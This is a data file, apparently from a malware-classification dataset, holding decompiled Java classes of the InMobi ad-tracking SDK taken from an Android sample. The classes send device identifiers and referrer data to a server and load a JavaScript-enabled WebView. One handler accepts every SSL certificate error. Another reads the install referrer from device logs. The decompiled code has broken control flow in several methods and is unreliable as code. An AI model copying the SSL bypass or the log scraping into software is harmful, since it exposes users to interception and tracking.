  }   }   private static void a(  String str,  Goal goal){     Boolean valueOf;     boolean isDuplicateGoal=goal.isDuplicateGoal();     int goalCount=goal.getGoalCount();     String goalName=goal.getGoalName();     if (!g()) {       valueOf=Boolean.valueOf(reportUsingWebview(str,goal));     }  else {       valueOf=Boolean.valueOf(reportUsingNetwork(str,goal));     }     if (valueOf.booleanValue()) {       FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_FIRST_GOAL_SUCCESS,true);       a.removeGoal(goalName,goalCount);       if (AdTrackerConstants.GOAL_DOWNLOAD.equals(goalName)) {         AdTrackerUtils.updateStatus();         return;       }       return;     }     a.increaseRetryTime(goalName,goalCount,isDuplicateGoal);   }   private static void f(){     String referrerFromLogs;     try {       if (!h() && (referrerFromLogs=AdTrackerUtils.getReferrerFromLogs()) != null) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Saving referrer from logs: "" + referrerFromLogs);         AdTrackerUtils.setReferrerFromLogs(InternalSDKUtil.getContext(),referrerFromLogs);       }     }  catch (    Exception e2) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to set referrer"",e2);     }   }   public static boolean reportUsingWebview(  String str,  Goal goal){     try {       int webviewTimeout=AdTrackerInitializer.getConfigParams().getWebviewTimeout();       h=new AdTrackerWebViewLoader();       AdTrackerRequestResponseBuilder.saveWebviewRequestParam(str,goal);       h.loadWebview(goal); synchronized (d) {         d.wait(webviewTimeout);       }       if (true == AdTrackerWebViewLoader.isWebviewLoading()) {         AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,goal,0,0L,AdTrackerConstants.NETWORK_TIMEOUT,null);       }       if (!g.get()) {         f.set(false);         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to upload goal: "" + goal.getGoalName());       }  else {         f.set(true);         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Uploaded goal successfully: "" + goal.getGoalName());       }       h.deinit(webviewTimeout);     }  catch (    Exception e2) {       f.set(false);       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to load webview Exception"",e2);     }     return g.get();   }   private static boolean g(){     try {       String preferences=FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.TIMETOLIVE);       String preferences2=FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.VALIDIDS);       Calendar calendar=Calendar.getInstance();       calendar.setTime(new Date());       calendar.getTime().toString();       if (preferences == null || preferences2 == null) {         return false;       }       Date time=calendar.getTime();       calendar.add(11,Integer.parseInt(preferences));       return calendar.getTime().after(time);     }  catch (    Exception e2) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Error parsing ttl"",e2);       return false;     }   }   private static boolean h(){     return FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.REFERRER) != null;   }   public static void notifyThread(){     try { synchronized (d) {         d.notify();       }     }  catch (    Exception e2) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to notify thread"",e2);     }   }   public static void waitThread(  int i2){     try { synchronized (d) {         d.wait(i2);       }     }  catch (    Exception e2) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to notify thread"",e2);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\AdTrackerRequestResponseBuilder.code","public class AdTrackerRequestResponseBuilder {   private static String a=null;   private static long b=0;   protected static String formHTTPRequest(  String str,  String str2,  int i,  boolean z,  String str3){     String str4;     LinkedList linkedList=new LinkedList();     String preferences=FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.REFERRER);     if (str != null && !str.trim().equals("""")) {       linkedList.add(new BasicNameValuePair(AdTrackerConstants.APP_ID,str));     }     String num=Integer.toString(new Random().nextInt());     linkedList.add(new BasicNameValuePair(AdTrackerConstants.UIDMAP,AdTrackerInitializer.getConfigParams().getUID().getUidMap(1,num,null)));     linkedList.add(new BasicNameValuePair(AdTrackerConstants.UIDKEY,num));     linkedList.add(new BasicNameValuePair(AdTrackerConstants.UKEYVER,UIDHelper.getRSAKeyVersion()));     if (str2 != null && !str2.trim().equals("""")) {       linkedList.add(new BasicNameValuePair(AdTrackerConstants.GOALNAME,str2));     }     if (z) {       linkedList.add(new BasicNameValuePair(AdTrackerConstants.LATE_PING,""1""));     }  else {       linkedList.add(new BasicNameValuePair(AdTrackerConstants.LATE_PING,""0""));     }     linkedList.add(new BasicNameValuePair(AdTrackerConstants.SOURCE,AdTrackerConstants.ANDROID));     if (i > 0) {       linkedList.add(new BasicNameValuePair(AdTrackerConstants.GOALCOUNT,Integer.toString(i)));     }     linkedList.add(new BasicNameValuePair(AdTrackerConstants.SDKVER,InMobi.getVersion()));     linkedList.add(new BasicNameValuePair(AdTrackerConstants.SDKREL_VER,InMobi.getVersion()));     linkedList.add(new BasicNameValuePair(AdTrackerConstants.OS_VERSION,String.valueOf(Build.VERSION.SDK_INT)));     String preferences2=FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_REFERRER_FROM_LOGCAT);     if (preferences2 == null) {       preferences2=""0"";     }     linkedList.add(new BasicNameValuePair(AdTrackerConstants.KEY_REFERRER_FROM_LOGCAT,preferences2));     try {       str4=InternalSDKUtil.getContext().getPackageManager().getPackageInfo(InternalSDKUtil.getContext().getPackageName(),0).versionName;     }  catch (    PackageManager.NameNotFoundException e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Cant get appversion"",e);       str4=null;     }     if (str4 != null && !str4.trim().equals("""")) {       linkedList.add(new BasicNameValuePair(AdTrackerConstants.APPVER,str4));     }     if (str3 != null && !str3.trim().equals("""")) {       linkedList.add(new BasicNameValuePair(AdTrackerConstants.VALIDIDS,str3));     }     if (preferences != null) {       int intPreferences=FileOperations.getIntPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.REFERRER_FROM_SDK);       long longPreferences=FileOperations.getLongPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_T2) - FileOperations.getLongPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.KEY_T1);       linkedList.add(new BasicNameValuePair(AdTrackerConstants.REFERRER_FROM_SDK,Integer.toString(intPreferences)));       linkedList.add(new BasicNameValuePair(AdTrackerConstants.REFERRER_DELAY,Long.toString(longPreferences)));     }     if (1 == AdTrackerNetworkInterface.isUnstableNetwork()) {       linkedList.add(new BasicNameValuePair(AdTrackerConstants.KEY_UNSTABLE_NETWORK,Integer.toString(AdTrackerNetworkInterface.isUnstableNetwork())));     }     linkedList.add(new BasicNameValuePair(AdTrackerConstants.TIMESTAMP,Long.toString(System.currentTimeMillis())));     return URLEncodedUtils.format(linkedList,""utf-8"");   }   public static AdTrackerConstants.StatusCode sendHTTPRequest(  String str,  Goal goal,  String str2){     Exception exc;     HttpResponse execute;     AdTrackerConstants.StatusCode statusCode;     AdTrackerConstants.StatusCode statusCode2=AdTrackerConstants.StatusCode.APP_ANALYTICS_UPLOAD_FAILURE;     try {       b=System.currentTimeMillis();       DefaultHttpClient defaultHttpClient=new DefaultHttpClient();       String preferences=FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.REFERRER);       String formHTTPRequest=formHTTPRequest(str,goal.getGoalName(),goal.getGoalCount(),goal.isDuplicateGoal(),str2);       int connectionTimeout=AdTrackerInitializer.getConfigParams().getConnectionTimeout();       String str3=AdTrackerNetworkInterface.a() + formHTTPRequest;       if (preferences != null) {         str3=str3 + ""&referrer="" + preferences;       }       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,str3);       HttpGet httpGet=new HttpGet(str3);       BasicHttpParams basicHttpParams=new BasicHttpParams();       HttpConnectionParams.setConnectionTimeout(basicHttpParams,connectionTimeout);       HttpConnectionParams.setSoTimeout(basicHttpParams,connectionTimeout);       defaultHttpClient.setParams(basicHttpParams);       execute=defaultHttpClient.execute(httpGet);     }  catch (    Exception e) {       exc=e;     }     if (execute.getStatusLine().getStatusCode() == 200) {       String entityUtils=EntityUtils.toString(execute.getEntity());       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""RESPONSE: "" + entityUtils);       JSONObject jSONObject=new JSONObject(entityUtils);       String string=jSONObject.getString(AdTrackerConstants.ERRORMSG);       int i=jSONObject.getInt(AdTrackerConstants.ERRORCODE);       if (6000 == i) {         AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_SUCCESS,goal,1,System.currentTimeMillis() - b,0,null);         statusCode=AdTrackerConstants.StatusCode.APP_ANALYTICS_UPLOAD_SUCCESS;       }  else {         AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,goal,1,0L,i,null);         statusCode=statusCode2;       }       if (6001 == i) {         try {           Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Error uploading ping "" + string + ""\nReloading webview"");           FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.VALIDIDS,(String)null);           if (AdTrackerNetworkInterface.reportUsingWebview(str,goal)) {             statusCode=AdTrackerConstants.StatusCode.APP_ANALYTICS_UPLOAD_SUCCESS;           }  else {             statusCode=AdTrackerConstants.StatusCode.APP_ANALYTICS_UPLOAD_FAILURE;           }           return statusCode;         }  catch (        Exception e2) {           exc=e2;           statusCode2=statusCode;           AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,goal,1,0L,AdTrackerConstants.EXCEPTION,exc.getMessage());           Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Error uploading Goal Ping"",exc);           return statusCode2;         }       }       return statusCode;     }     AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,goal,1,0L,execute.getStatusLine().getStatusCode(),null);     return statusCode2;   }   public static boolean serverReachable(  String str){     try {     }  catch (    Exception e) {       Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Server not reachable..Logging events"");     }     if (new DefaultHttpClient().execute(new HttpGet(str)).getStatusLine().getStatusCode() == 200) {       return true;     }     return false;   }   public static void saveWebviewRequestParam(  String str,  Goal goal){     a=formHTTPRequest(str,goal.getGoalName(),goal.getGoalCount(),goal.isDuplicateGoal(),null);   }   public static String getWebViewRequestParam(){     return a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\AdTrackerWebViewLoader.code","public class AdTrackerWebViewLoader {   private static WebView a=null;   private static AtomicBoolean b;   private long c=0;   private long d=0;   private Goal e;   public static boolean isWebviewLoading(){     return b.get();   }   public static WebView getWebview(){     return a;   } class e implements Runnable {     e(){     }     @Override public void run(){       AtomicBoolean unused=AdTrackerWebViewLoader.b=new AtomicBoolean(false);       WebView unused2=AdTrackerWebViewLoader.a=new WebView(InternalSDKUtil.getContext());       AdTrackerWebViewLoader.a.setWebViewClient(new MyWebViewClient());       AdTrackerWebViewLoader.a.getSettings().setJavaScriptEnabled(true);       AdTrackerWebViewLoader.a.getSettings().setCacheMode(2);       AdTrackerWebViewLoader.a.addJavascriptInterface(new JSInterface(),AdTrackerConstants.IATNAMESPACE);     }   }   public AdTrackerWebViewLoader(){     AdTrackerNetworkInterface.getUIHandler().post(new e());   } public class a implements Runnable {     a(){     }     @Override public void run(){       if (AdTrackerWebViewLoader.a != null) {         AdTrackerWebViewLoader.a.stopLoading();         AdTrackerWebViewLoader.a.destroy();         WebView unused=AdTrackerWebViewLoader.a=null;         AdTrackerWebViewLoader.b.set(false);       }     }   }   public void deinit(  int i){     AdTrackerNetworkInterface.getUIHandler().postDelayed(new a(),i);   } class c implements Runnable {     c(){     }     @Override public void run(){       if (AdTrackerWebViewLoader.a != null) {         AdTrackerWebViewLoader.b.set(false);       }       AdTrackerWebViewLoader.a.stopLoading();     }   }   public void stopLoading(){     AdTrackerNetworkInterface.getUIHandler().post(new c());   } protected class MyWebViewClient extends WebViewClient {     protected MyWebViewClient(){     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       try {         if (AdTrackerWebViewLoader.b.compareAndSet(true,false)) {           AdTrackerWebViewLoader.this.d=System.currentTimeMillis() - AdTrackerWebViewLoader.this.c;           if (str.contains(""iat"")) {             d a=AdTrackerWebViewLoader.this.a(str.substring(7));             if (a == null) {               AdTrackerNetworkInterface.setWebviewUploadStatus(false);             }  else {               FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.ERRORCODE,Integer.toString(a.a));               if (5000 == a.a) {                 if (AdTrackerWebViewLoader.this.b(a.b)) {                   AdTrackerNetworkInterface.setWebviewUploadStatus(true);                 }  else {                   AdTrackerNetworkInterface.setWebviewUploadStatus(false);                 }               }  else {                 AdTrackerNetworkInterface.setWebviewUploadStatus(false);                 AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,AdTrackerWebViewLoader.this.e,0,0L,a.a,null);               }             }           } synchronized (AdTrackerNetworkInterface.getNetworkThread()) {             AdTrackerNetworkInterface.getNetworkThread().notify();           }         }         webView.loadUrl(str);       }  catch (      Exception e) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Exception Should Override Error"",e);       }       return true;     }     @Override public void onReceivedError(    WebView webView,    int i,    String str,    String str2){       try {         if (AdTrackerWebViewLoader.b.compareAndSet(true,false)) {           AdTrackerNetworkInterface.setWebviewUploadStatus(false); synchronized (AdTrackerNetworkInterface.getNetworkThread()) {             AdTrackerNetworkInterface.getNetworkThread().notify();           }           AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,AdTrackerWebViewLoader.this.e,0,0L,i,null);           Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Webview Received Error"");         }       }  catch (      Exception e) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Exception onReceived Error"",e);       }       super.onReceivedError(webView,i,str,str2);     }     @Override public void onReceivedSslError(    WebView webView,    SslErrorHandler sslErrorHandler,    SslError sslError){       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""SSL Error. Proceeding"" + sslError);       try {         if (AdTrackerWebViewLoader.b.compareAndSet(true,false)) {           AdTrackerNetworkInterface.setWebviewUploadStatus(false); synchronized (AdTrackerNetworkInterface.getNetworkThread()) {             AdTrackerNetworkInterface.getNetworkThread().notify();           }           AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,AdTrackerWebViewLoader.this.e,0,0L,sslError.getPrimaryError(),null);           Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Webview Received SSL Error"");         }       }  catch (      Exception e) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Exception onReceived SSL Error"",e);       }       sslErrorHandler.proceed();     }   } protected static class JSInterface {     protected JSInterface(){     }     @JavascriptInterface public String getParams(){       String preferences=FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.REFERRER);       String webViewRequestParam=AdTrackerRequestResponseBuilder.getWebViewRequestParam();       if (preferences != null) {         webViewRequestParam=webViewRequestParam + ""&referrer="" + preferences;       }       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Request param for webview"" + webViewRequestParam);       return webViewRequestParam;     }   }   public d a(  String str){     Exception exc;     int i;     d dVar=new d();     try {       String str2=null;       int i2=0;       for (      String str3 : str.split(""&"")) {         try {           String[] split=str3.split(""="");           for (int i3=0; i3 < split.length; i3++) {             if (AdTrackerConstants.ERROR.equals(split[i3])) {               i2=Integer.parseInt(split[i3 + 1]);             }  else             if (AdTrackerConstants.RESPONSE.equals(split[i3])) {               str2=split[i3 + 1];             }           }         }  catch (        Exception e2) {           exc=e2;           i=i2;           AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,this.e,0,0L,i,null);           Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Check content Exception"",exc);           return null;         }       }       dVar.a=i2;       dVar.b=str2;       if (5003 == i2) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Webview Timeout "" + str2);       }  else       if (5001 == i2) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Invalid params passed "" + str2);       }  else       if (5002 == i2) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""XMLHTTP request not supported "" + str2);       }  else       if (5005 == i2) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Invalid JSON Response "" + str2);       }  else       if (5004 == i2) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Webview Server Error "" + str2);       }  else       if (5000 == i2) {         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Webview response "" + URLDecoder.decode(str2,""utf-8""));       }       return dVar;     }  catch (    Exception e3) {       exc=e3;       i=0;     }   }   public boolean b(  String str){     boolean z;     try {       JSONObject jSONObject=new JSONObject(URLDecoder.decode(str,""utf-8""));       JSONObject jSONObject2=jSONObject.getJSONObject(AdTrackerConstants.VALIDIDS);       String string=jSONObject.getString(AdTrackerConstants.ERRORMSG);       int i=jSONObject.getInt(AdTrackerConstants.TIMETOLIVE);       int i2=jSONObject.getInt(AdTrackerConstants.ERRORCODE);       if (i2 != 6000) {         AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,this.e,0,0L,i2,null);         Log.debug(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to upload goal in webview"" + string);         z=false;       }  else {         AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_SUCCESS,this.e,0,this.d,0,null);         String jSONObject3=jSONObject2.toString();         if (i2 == 6001) {           jSONObject3=null;         }         FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.VALIDIDS,jSONObject3);         FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.TIMETOLIVE,Integer.toString(i));         z=true;       }       return z;     }  catch (    Exception e2) {       AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,this.e,0,0L,AdTrackerConstants.EXCEPTION,e2.getMessage());       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Failed to upload goal in webview"",e2);       return false;     }   } public static class d {     private int a=0;     private String b=null;   }   public boolean loadWebview(  Goal goal){     this.e=goal;     try {       AdTrackerNetworkInterface.getUIHandler().post(new b());       return true;     }  catch (    Exception e2) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,e2.toString());       return false;     }   } public class b implements Runnable {     b(){     }     @Override public void run(){       AdTrackerWebViewLoader.this.c=System.currentTimeMillis();       AdTrackerWebViewLoader.b.set(true);       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Load Webview: "" + AdTrackerNetworkInterface.b());       AdTrackerWebViewLoader.a.loadUrl(AdTrackerNetworkInterface.b());     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\b.code","public class b implements Runnable {   b(){   }   @Override public void run(){     AdTrackerWebViewLoader.this.c=System.currentTimeMillis();     AdTrackerWebViewLoader.b.set(true);     Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Load Webview: "" + AdTrackerNetworkInterface.b());     AdTrackerWebViewLoader.a.loadUrl(AdTrackerNetworkInterface.b());   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\c.code","class c implements Runnable {   c(){   }   @Override public void run(){     if (AdTrackerWebViewLoader.a != null) {       AdTrackerWebViewLoader.b.set(false);     }     AdTrackerWebViewLoader.a.stopLoading();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\d.code","public static class d {   private int a=0;   private String b=null; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\e.code","class e implements Runnable {   e(){   }   @Override public void run(){     AtomicBoolean unused=AdTrackerWebViewLoader.b=new AtomicBoolean(false);     WebView unused2=AdTrackerWebViewLoader.a=new WebView(InternalSDKUtil.getContext());     AdTrackerWebViewLoader.a.setWebViewClient(new MyWebViewClient());     AdTrackerWebViewLoader.a.getSettings().setJavaScriptEnabled(true);     AdTrackerWebViewLoader.a.getSettings().setCacheMode(2);     AdTrackerWebViewLoader.a.addJavascriptInterface(new JSInterface(),AdTrackerConstants.IATNAMESPACE);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\JSInterface.code","protected static class JSInterface {   protected JSInterface(){   }   @JavascriptInterface public String getParams(){     String preferences=FileOperations.getPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.REFERRER);     String webViewRequestParam=AdTrackerRequestResponseBuilder.getWebViewRequestParam();     if (preferences != null) {       webViewRequestParam=webViewRequestParam + ""&referrer="" + preferences;     }     Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Request param for webview"" + webViewRequestParam);     return webViewRequestParam;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.iat.impl.net\MyWebViewClient.code","protected class MyWebViewClient extends WebViewClient {   protected MyWebViewClient(){   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     try {       if (AdTrackerWebViewLoader.b.compareAndSet(true,false)) {         AdTrackerWebViewLoader.this.d=System.currentTimeMillis() - AdTrackerWebViewLoader.this.c;         if (str.contains(""iat"")) {           d a=AdTrackerWebViewLoader.this.a(str.substring(7));           if (a == null) {             AdTrackerNetworkInterface.setWebviewUploadStatus(false);           }  else {             FileOperations.setPreferences(InternalSDKUtil.getContext(),AdTrackerConstants.IMPREF_FILE,AdTrackerConstants.ERRORCODE,Integer.toString(a.a));             if (5000 == a.a) {               if (AdTrackerWebViewLoader.this.b(a.b)) {                 AdTrackerNetworkInterface.setWebviewUploadStatus(true);               }  else {                 AdTrackerNetworkInterface.setWebviewUploadStatus(false);               }             }  else {               AdTrackerNetworkInterface.setWebviewUploadStatus(false);               AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,AdTrackerWebViewLoader.this.e,0,0L,a.a,null);             }           }         } synchronized (AdTrackerNetworkInterface.getNetworkThread()) {           AdTrackerNetworkInterface.getNetworkThread().notify();         }       }       webView.loadUrl(str);     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Exception Should Override Error"",e);     }     return true;   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     try {       if (AdTrackerWebViewLoader.b.compareAndSet(true,false)) {         AdTrackerNetworkInterface.setWebviewUploadStatus(false); synchronized (AdTrackerNetworkInterface.getNetworkThread()) {           AdTrackerNetworkInterface.getNetworkThread().notify();         }         AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,AdTrackerWebViewLoader.this.e,0,0L,i,null);         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Webview Received Error"");       }     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Exception onReceived Error"",e);     }     super.onReceivedError(webView,i,str,str2);   }   @Override public void onReceivedSslError(  WebView webView,  SslErrorHandler sslErrorHandler,  SslError sslError){     Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""SSL Error. Proceeding"" + sslError);     try {       if (AdTrackerWebViewLoader.b.compareAndSet(true,false)) {         AdTrackerNetworkInterface.setWebviewUploadStatus(false); synchronized (AdTrackerNetworkInterface.getNetworkThread()) {           AdTrackerNetworkInterface.getNetworkThread().notify();         }         AdTrackerUtils.reportMetric(AdTrackerEventType.GOAL_FAILURE,AdTrackerWebViewLoader.this.e,0,0L,sslError.getPrimaryError(),null);         Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Webview Received SSL Error"");       }     }  catch (    Exception e) {       Log.internal(AdTrackerConstants.IAT_LOGGING_TAG,""Exception onReceived SSL Error"",e);     }     sslErrorHandler.proceed();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.net\a.code","class a implements AnalyticsConnectivityReceiver.a {   @Override public void a(){     Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Connectivity gone"");   }   @Override public void b(){     Handler handler;     Handler handler2;     Log.internal(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Connectivity came"");     handler=AnalyticsNetworkManager.a;     if (handler != null && !AnalyticsUtils.getStartHandle()) {       AnalyticsUtils.setStartHandle(true);       handler2=AnalyticsNetworkManager.a;       handler2.sendEmptyMessageDelayed(1001,AnalyticsUtils.getTimeinterval());     }   } } interface a {   void a();   void b(); } class a extends Thread {   a(){   } class C0021a implements Handler.Callback {     C0021a(){     }     @Override public boolean handleMessage(    Message message){       Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""NetworkManager->handleMessag: msg:"" + message);       if (message.what == 1001) {         if (AnalyticsInitializer.getConfigParams().getAutomaticCapture().getAutoSessionCapture() || AnalyticsEventsWrapper.isEventsUser()) {           AnalyticsNetworkManager.this.b();         }  else {           AnalyticsUtils.setStartHandle(false);         }       }       return true;     }   }   @Override public void run(){     Looper.prepare();     Handler unused=AnalyticsNetworkManager.a=new Handler(new C0021a());     Looper.loop();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.net\AnalyticsCommon.code","public class AnalyticsCommon { public interface HttpRequestCallback {     public static final int HTTP_FAILURE=1;     public static final int HTTP_SUCCESS=0;     void notifyResult(    int i,    Object obj);   }   public HttpURLConnection setupConnection(  String str) throws IOException {     HttpURLConnection httpURLConnection=(HttpURLConnection)new URL(str).openConnection();     a(httpURLConnection);     return httpURLConnection;   }   private static void a(  HttpURLConnection httpURLConnection) throws ProtocolException {     httpURLConnection.setDoOutput(true);     httpURLConnection.setDoInput(true);     httpURLConnection.setConnectTimeout(60000);     httpURLConnection.setReadTimeout(60000);     httpURLConnection.setRequestMethod(""POST"");     httpURLConnection.setRequestProperty(""Content-Type"",""application/x-www-form-urlencoded"");     InternalSDKUtil.addCommonPropertiesToConnection(httpURLConnection);   }   public void postData(  HttpURLConnection httpURLConnection,  String str) throws IOException {     BufferedWriter bufferedWriter;     httpURLConnection.setRequestProperty(""Content-Length"",Integer.toString(str.length()));     try {       bufferedWriter=new BufferedWriter(new OutputStreamWriter(httpURLConnection.getOutputStream()));     }  catch (    Throwable th) {       th=th;       bufferedWriter=null;     }     try {       bufferedWriter.write(str);       closeResource(bufferedWriter);     }  catch (    Throwable th2) {       th=th2;       closeResource(bufferedWriter);       throw th;     }   }   public void closeResource(  Closeable closeable){     if (closeable != null) {       try {         closeable.close();       }  catch (      IOException e) {         Log.d(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""Exception closing resource: "" + closeable,e);       }     }   }   public static String getURLEncoded(  String str){     try {       return URLEncoder.encode(str,""UTF-8"");     }  catch (    Exception e) {       return """";     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.net\AnalyticsConnectivityReceiver.code","public class AnalyticsConnectivityReceiver extends BroadcastReceiver {   private a a;   private boolean b; interface a {     void a();     void b();   }   public AnalyticsConnectivityReceiver(  Context context,  a aVar){     this.a=aVar;     bind(context);   }   public final void bind(  Context context){     IntentFilter intentFilter=new IntentFilter();     intentFilter.addAction(""android.net.conn.CONNECTIVITY_CHANGE"");     context.registerReceiver(this,intentFilter);   }   public void unbind(  Context context){     context.unregisterReceiver(this);   }   @Override public void onReceive(  Context context,  Intent intent){     if (intent.getBooleanExtra(""noConnectivity"",false)) {       this.b=false;       if (this.a != null) {         this.a.a();         return;       }       return;     }     if (!intent.getBooleanExtra(""noConnectivity"",false)) {       this.b=true;       if (this.a != null) {         this.a.b();       }     }   }   public boolean isConnected(){     return this.b;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.commons.analytics.net\AnalyticsNetworkManager.code","public final class AnalyticsNetworkManager {   public static final int MESSAGE_PING=1001;   private static Handler a;   private static AnalyticsNetworkManager b;   private static AnalyticsConnectivityReceiver.a f=new com.inmobi.commons.analytics.net.a();   private AnalyticsPayloadBuilder c;   private AnalyticsConnectivityReceiver d;   private int e=0;   private AnalyticsNetworkManager(){     new a().start();     Log.debug(AnalyticsUtils.ANALYTICS_LOGGING_TAG,""NetworkManager-> Constructor "");   }   public static Handler getHandler(){     return a;   }   public static synchronized AnalyticsNetworkManager startInstance(){     AnalyticsNetworkManager analyticsNetworkManager; synchronized (AnalyticsNetworkManager.class) {       if (b == null) {         b=new AnalyticsNetworkManager();       }       if (b.c == null) {         b.c=new AnalyticsPayloadBuilder();       }       if (b.d == 